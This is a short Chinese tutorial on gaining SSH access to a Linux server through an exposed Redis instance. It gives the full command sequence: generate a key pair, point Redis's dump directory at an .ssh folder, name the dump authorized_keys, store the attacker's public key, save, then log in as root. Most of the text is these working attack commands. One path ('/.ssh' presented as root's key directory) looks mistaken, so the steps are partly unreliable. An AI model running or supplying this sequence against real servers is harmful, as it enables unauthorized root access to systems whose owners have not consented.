# 利用Redis写文件提权登陆linux的漏洞

## 原理

利用redis的config命令修改rdb文件地址为ssh密钥文件，向redis中写入公共密钥，通过save命令手动刷新到rdb中，此时就可以用私钥登陆了

## 操作

在本地电脑中（linux为例）生成无密码的密钥

```
ssh-keygen -t rsa -P ''    # 后面直接回车
```

此时在~/.ssh/下生成两个文件`id_rsa`和`id_rsa.pub`，id_rsa是私钥，id_rsa_pub是公钥，公钥文件内容如下：

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCf53Tg8bfLm8UQBFgm31YpMPuGDY3eWQ5GCiP4E7hdaSBvqSjeMjUOy5NWLg424BFWSFiKNF8oRBZpXtfhu+4AwgrwdSDJuKQtjJvrh7D+rnuxtzpGbqL/716S0e/+VHeh8PXnC+GPAMg72p7zDzHuYkvwkx/r6LSY9fspU25lHH4I9VrrxgPoS+BbU03i9LiGZFSTUSAljTJE3H5bPNpRPWlHlAZTxGXTYIGO+K2ZnUAg2+HtS246NONl6z1lVtxrS5G4yuiTeHJr+KWJD/DOiZ50EoYqbTHsjnTAM5MJTLHWH1jBIZ133OHW5RGmzyEuws6ge0Y6eGnxgwm2W09p uvince@DESKTOP-6JIM4T8
```



进入服务器的redis命令行，输入如下一系列命令(注意ssh-rsa内容前后要有回车符\n)：

```
config set dir /.ssh

config set dbfilename authorized_keys

set ssh-test "\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCf53Tg8bfLm8UQBFgm31YpMPuGDY3eWQ5GCiP4E7hdaSBvqSjeMjUOy5NWLg424BFWSFiKNF8oRBZpXtfhu+4AwgrwdSDJuKQtjJvrh7D+rnuxtzpGbqL/716S0e/+VHeh8PXnC+GPAMg72p7zDzHuYkvwkx/r6LSY9fspU25lHH4I9VrrxgPoS+BbU03i9LiGZFSTUSAljTJE3H5bPNpRPWlHlAZTxGXTYIGO+K2ZnUAg2+HtS246NONl6z1lVtxrS5G4yuiTeHJr+KWJD/DOiZ50EoYqbTHsjnTAM5MJTLHWH1jBIZ133OHW5RGmzyEuws6ge0Y6eGnxgwm2W09p uvince@DESKTOP-6JIM4T8\n"

save
```

此时，就已经往authorized_keys文件中写入了公钥



本地电脑使用命令`ssh -i ~/.ssh/id_rsa root@10.0.2.100`能够登陆服务器，这里-i后面是私钥的路径



这里面，有几个限制，一个是redis写文件的权限要能够到达该目录。现在写入的是root用户中，所以redis需要以root用户启动。如果知道某台服务器上有哪个用户，就可以把config set dir /.ssh 改为 config set dir /home/username/.ssh 了，最好还是redis和那个用户是同一个用户，这时候用config set dir ~/.ssh